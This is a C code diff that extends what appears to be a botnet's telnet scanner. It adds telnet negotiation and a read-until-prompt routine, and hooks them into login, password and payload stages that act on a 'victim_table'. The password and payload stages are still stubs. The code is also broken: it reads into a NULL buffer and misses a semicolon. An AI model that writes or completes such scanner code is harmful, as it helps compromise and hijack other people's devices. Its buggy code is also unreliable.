@@ -62,6 +62,68 @@ static unsigned short csum(unsigned short *ptr, int nbytes)
 	return (answer);
 }
 
+#define TELNET_DO 0xFD
+#define TELNET_WONT 0xFC
+#define TELNET_WILL 0xFB
+#define TELNET_DONT 0xFE
+#define TELNET_CMD 0xFF
+#define TELNET_CMD_ECHO 1
+#define TELNET_CMD_WINDOW_SIZE 31
+ 
+bool scan_negotiate(int sock, unsigned char *buf, int len) {     
+	if (buf[1] == TELNET_DO && buf[2] == TELNET_CMD_WINDOW_SIZE)
+	{
+		unsigned char tmp1[4] = {255, 251, 31};
+		unsigned char tmp2[10] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
+
+		if (send(sock, tmp1, 3, 0) < 0)
+			return false;
+		if (send(sock, tmp2, 9, 0) < 0)
+			return false;
+
+		return true;
+	}
+	 
+	for (uint8_t i = 0; i < len; i++)
+	{
+		if (buf[i] == TELNET_DO)
+			buf[i] = TELNET_WONT;
+		else if (buf[i] == TELNET_WILL)
+			buf[i] = TELNET_DO;
+	}
+	if (send(sock, buf, len, 0) < 0)
+		return false;
+
+	return true;
+}
+
+bool scan_readuntil(int sock, char *str)
+{
+	int16_t i;
+	uint8_t pos = 0;
+	int8_t len = strlen(str);
+	unsigned char *buf = NULL;
+	while (1)
+	{
+		if (recv(sock, buf, 1, 0) < 0) // Read 1 from socket
+			return false;
+		if (*buf == TELNET_CMD)
+		{
+			uint8_t longbuf[4];
+			if ((i = recv(sock, longbuf, 3, 0)) <= 0)
+				return false;
+			scan_negotiate(sock, longbuf, 3);
+		}
+		else if(*buf == str[pos])
+		{
+			if (pos++ == len)
+				return true;
+		}
+		else
+			pos = 0;
+	}
+}
+
 bool scan_scanner(void)
 {
 	int32_t max = getdtablesize();
@@ -265,15 +327,24 @@ skip:
 				} 
 				case USERNAME:
 				{
+					/*
+					Need to make this readuntil accept more than one string
 
+					so I can do const userwords[] {
+						"login",
+						"user"
+					}
+					then go readuntil(sock, userwords)
+					*/
+					scan_readuntil(victim_table[i].sock, "login")
 				}
 				case PASSWORD:
 				{
-
+					
 				}
 				case PAYLOAD:
 				{
-
+					// send(payload)
 				}
 				case FINISHED:
 				{
